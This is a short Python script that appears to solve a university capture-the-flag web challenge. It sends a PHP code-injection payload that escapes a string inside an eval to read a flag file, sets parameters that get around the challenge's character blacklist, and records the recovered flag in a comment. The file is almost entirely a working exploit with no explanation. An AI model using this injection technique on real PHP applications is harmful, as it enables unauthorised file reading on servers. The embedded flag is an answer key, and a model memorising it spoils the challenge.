import requests
IP = 'http://ctf99.cs.ui.ac.id:9004/'

blacklist = "[^$]"
maxlength = 69420
payload = b"'.(file('pr1z3_f0R_7hE_ch4mp.txt')[0]).'"  # CSCE604258{selama_ada_eval_hidup_tidak_aman_tentram}
params = {
    'blacklist': blacklist,
    'maxlength': maxlength,
    'name': payload
}
print(params)
response = requests.post(IP, params=params)
print(response.text)
